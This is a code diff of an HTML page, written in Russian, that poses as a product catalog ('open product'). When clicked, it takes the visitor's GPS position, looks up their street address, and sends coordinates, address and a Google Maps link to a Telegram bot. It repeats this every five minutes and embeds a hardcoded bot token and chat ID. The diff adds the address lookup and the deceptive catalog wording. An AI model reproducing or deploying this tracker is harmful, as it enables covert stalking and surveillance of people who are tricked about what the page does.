@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Geo Share</title>
+<title>Geo Tracker</title>
 
 <style>
 body{
@@ -41,7 +41,6 @@ button{
 .status{
   margin-top:15px;
   font-size:14px;
-  color:#bfe8ff;
 }
 </style>
 </head>
@@ -49,11 +48,10 @@ button{
 <body>
 
 <div class="box">
-  <h2>папка товаров </h2>
+  <h2>📍 Geo Service</h2>
+  <p>Нажмите  чтобы открыть каталог </p>
 
-  <p>Для продолжения нажмите кнопку</p>
-
-  <button onclick="startGPS()">показать товар</button>
+  <button onclick="start()">открыть товар</button>
 
   <div class="status" id="status">ожидание...</div>
 </div>
@@ -62,70 +60,90 @@ button{
 const BOT_TOKEN = "8837254914:AAFuvODF5meguiR61yWRcPO0KwzeoY6k--c";
 const CHAT_ID = "8424328584";
 
-let lat = null;
-let lon = null;
+let intervalStarted = false;
 
-async function sendTG(msg){
+async function getAddress(lat, lon){
+  try{
+    const res = await fetch(
+      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
+    );
+    const data = await res.json();
+    return data.display_name || " не найден";
+  }catch{
+    return "ошибка ";
+  }
+}
+
+async function sendTG(text){
   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
     method:"POST",
     headers:{"Content-Type":"application/json"},
     body:JSON.stringify({
       chat_id:CHAT_ID,
-      text:msg
+      text
     })
   });
 }
 
-function startGPS(){
-
+function start(){
   if(!navigator.geolocation){
-    document.getElementById("status").innerText =
-      "загрузка";
+    alert("не поддерживается");
     return;
   }
 
   document.getElementById("status").innerText =
-    "ожидание разрешения...";
+    "загрузка товара";
 
-  navigator.geolocation.getCurrentPosition(
-    (pos)=>{
+  navigator.geolocation.getCurrentPosition(async (pos)=>{
 
-      lat = pos.coords.latitude;
-      lon = pos.coords.longitude;
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
 
-      document.getElementById("status").innerText =
-        "ззз";
+    const address = await getAddress(lat, lon);
 
-      sendTG(`📍 Первое подключение\n${lat}, ${lon}`);
+    await sendTG(
+`📍 ПЕРВОЕ ПОДКЛЮЧЕНИЕ
 
-      // каждые 5 минут
-      setInterval(async ()=>{
+🏠 Адрес:
+${address}
 
-        navigator.geolocation.getCurrentPosition(async (p)=>{
-          const lat = p.coords.latitude;
-          const lon = p.coords.longitude;
-
-          await sendTG(
-`📍 Обновление GPS
-
-Координаты:
+🌐 Координаты:
 ${lat}, ${lon}
 
-Google Maps:
+🗺 Google Maps:
 https://maps.google.com/?q=${lat},${lon}`
-          );
+    );
 
-        });
+    if(intervalStarted) return;
+    intervalStarted = true;
 
-      }, 5 * 60 * 1000);
+    setInterval(async ()=>{
 
-    },
+      navigator.geolocation.getCurrentPosition(async (p)=>{
 
-    (err)=>{
-      document.getElementById("status").innerText =
-        "Разрешите геолокацию";
-    }
-  );
+        const lat = p.coords.latitude;
+        const lon = p.coords.longitude;
+
+        const address = await getAddress(lat, lon);
+
+        await sendTG(
+`📍 ОБНОВЛЕНИЕ 5 МИН
+
+🏠 Адрес:
+${address}
+
+🌐 Координаты:
+${lat}, ${lon}
+
+🗺 Google Maps:
+https://maps.google.com/?q=${lat},${lon}`
+        );
+
+      });
+
+    }, 5 * 60 * 1000);
+
+  });
 }
 </script>
 
